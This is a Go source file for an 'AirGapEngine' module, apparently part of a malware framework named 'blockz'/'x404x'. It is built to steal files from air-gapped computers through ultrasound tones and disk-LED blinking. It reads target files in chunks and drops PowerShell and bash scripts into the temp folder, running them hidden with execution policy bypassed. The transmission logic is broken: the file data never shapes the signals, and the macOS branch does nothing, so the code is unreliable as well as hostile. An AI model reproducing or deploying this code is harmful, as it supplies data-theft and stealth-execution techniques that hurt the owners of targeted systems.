package blockz

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

type AirGapEngine struct {
	Config         *BlockZConfig
	ExfiltratedBytes int    `json:"exfiltrated_bytes"`
	UltrasoundFreq   int    `json:"ultrasound_freq"`
	LEDFreq          int    `json:"led_freq"`
	TargetSSID       string `json:"target_ssid"`
	BridgeEstablished bool  `json:"bridge_established"`
}

type AirGapSignal struct {
	Type      string `json:"type"`
	Frequency int    `json:"frequency_hz"`
	Duration  int    `json:"duration_ms"`
	Data      []byte `json:"data"`
	Modulated string `json:"modulated"`
}

func NewAirGapEngine(cfg *BlockZConfig) *AirGapEngine {
	return &AirGapEngine{
		Config:        cfg,
		UltrasoundFreq: 22000,
		LEDFreq:        300,
	}
}

func (ag *AirGapEngine) ExfiltrateViaUltrasound(data []byte) bool {
	modulated := modulateFSK(data, ag.UltrasoundFreq, 200)
	signal := AirGapSignal{
		Type: "ultrasound", Frequency: ag.UltrasoundFreq,
		Duration: len(modulated) * 10, Data: data, Modulated: modulated,
	}

	ag.transmitUltrasound(signal)

	ag.ExfiltratedBytes += len(data)
	return true
}

func (ag *AirGapEngine) transmitUltrasound(signal AirGapSignal) {
	switch runtime.GOOS {
	case "windows":
		psScript := fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms
$player = New-Object System.Media.SoundPlayer
$player.SoundLocation = "C:\Windows\Media\chimes.wav"
$player.Play()
# Generate ultrasound via frequency manipulation
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class Ultrasonic {
    [DllImport("kernel32.dll")]
    public static extern bool Beep(int freq, int duration);
}
'@
for ($i = 0; $i -lt 10; $i++) { [Ultrasonic]::Beep(%d, 50) }
`, ag.UltrasoundFreq)
		psPath := filepath.Join(os.TempDir(), "x404x_ultrasound.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	case "linux":
		script := fmt.Sprintf(`#!/bin/bash
# Generate ultrasound via speaker (inaudible to humans)
speaker-test -t sine -f %d -l 1 -p 1000 2>/dev/null &
sleep 2
pkill speaker-test
`, ag.UltrasoundFreq)
		scriptPath := filepath.Join(os.TempDir(), "x404x_ultrasound.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		exec.Command("bash", scriptPath).Start()
	case "darwin":
		script := fmt.Sprintf(`#!/bin/bash
osascript -e 'set volume output muted false'
afplay /System/Library/Sounds/Ping.aiff &
`, )
		_ = script
	}
}

func (ag *AirGapEngine) ExfiltrateViaLED(data []byte) bool {
	bits := bytesToBits(data)
	modulated := modulateOOK(bits, ag.LEDFreq)

	signal := AirGapSignal{
		Type: "led_optical", Frequency: ag.LEDFreq,
		Duration: len(bits) * (1000 / ag.LEDFreq), Data: data, Modulated: modulated,
	}

	ag.transmitLED(signal)
	ag.ExfiltratedBytes += len(data)
	return true
}

func (ag *AirGapEngine) transmitLED(signal AirGapSignal) {
	switch runtime.GOOS {
	case "windows":
		psScript := `$disk = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | Select-Object -First 1
for ($i = 0; $i -lt 100; $i++) {
    $disk.DeviceID | Out-Null
    Start-Sleep -Milliseconds 5
}`
		psPath := filepath.Join(os.TempDir(), "x404x_led_tx.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	case "linux":
		script := `#!/bin/bash
for i in $(seq 1 100); do
    dd if=/dev/sda of=/dev/null bs=512 count=1 2>/dev/null
    usleep 5000
done`
		scriptPath := filepath.Join(os.TempDir(), "x404x_led_tx.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		exec.Command("bash", scriptPath).Start()
	}
}

func (ag *AirGapEngine) ActivateBridge(smode string) bool {
	if smode == "ultrasound" {
		ag.BridgeEstablished = true
		return ag.EstablishUltrasonicBridge()
	} else if smode == "led" {
		ag.BridgeEstablished = true
		return ag.EstablishLEDBridge()
	}
	return false
}

func (ag *AirGapEngine) EstablishUltrasonicBridge() bool {
	handshake := []byte("X404X_BRIDGE_SYN")
	return ag.ExfiltrateViaUltrasound(handshake)
}

func (ag *AirGapEngine) EstablishLEDBridge() bool {
	handshake := []byte("X404X_OPTICAL_SYN")
	return ag.ExfiltrateViaLED(handshake)
}

func (ag *AirGapEngine) ExfiltrateLargeFile(filePath string, method string) int {
	data, err := os.ReadFile(filePath)
	if err != nil || len(data) > 10*1024*1024 {
		return 0
	}

	chunkSize := 256
	totalSent := 0

	for i := 0; i < len(data); i += chunkSize {
		end := i + chunkSize
		if end > len(data) {
			end = len(data)
		}
		chunk := data[i:end]

		switch method {
		case "ultrasound":
			ag.ExfiltrateViaUltrasound(chunk)
		case "led":
			ag.ExfiltrateViaLED(chunk)
		default:
			ag.ExfiltrateViaUltrasound(chunk)
		}
		totalSent += len(chunk)
		time.Sleep(50 * time.Millisecond)
	}

	return totalSent
}

func modulateFSK(data []byte, carrierHz, deviationHz int) string {
	var modulated string
	for _, b := range data {
		for i := 7; i >= 0; i-- {
			bit := (b >> i) & 1
			if bit == 1 {
				modulated += fmt.Sprintf("F%d ", carrierHz+deviationHz)
			} else {
				modulated += fmt.Sprintf("F%d ", carrierHz-deviationHz)
			}
		}
	}
	return modulated
}

func modulateOOK(bits []int, freqHz int) string {
	var modulated string
	for _, bit := range bits {
		if bit == 1 {
			modulated += fmt.Sprintf("ON:%dms ", 1000/freqHz)
		} else {
			modulated += fmt.Sprintf("OFF:%dms ", 1000/freqHz)
		}
	}
	return modulated
}

func bytesToBits(data []byte) []int {
	bits := make([]int, len(data)*8)
	for i, b := range data {
		for j := 0; j < 8; j++ {
			if b&(1<<uint(7-j)) != 0 {
				bits[i*8+j] = 1
			}
		}
	}
	return bits
}

func (ag *AirGapEngine) GetStatusJSON() string {
	return fmt.Sprintf(`{"exfiltrated_bytes":%d,"bridge_established":%v,"ultrasound_freq":%d,"led_freq":%d}`,
		ag.ExfiltratedBytes, ag.BridgeEstablished, ag.UltrasoundFreq, ag.LEDFreq)
}
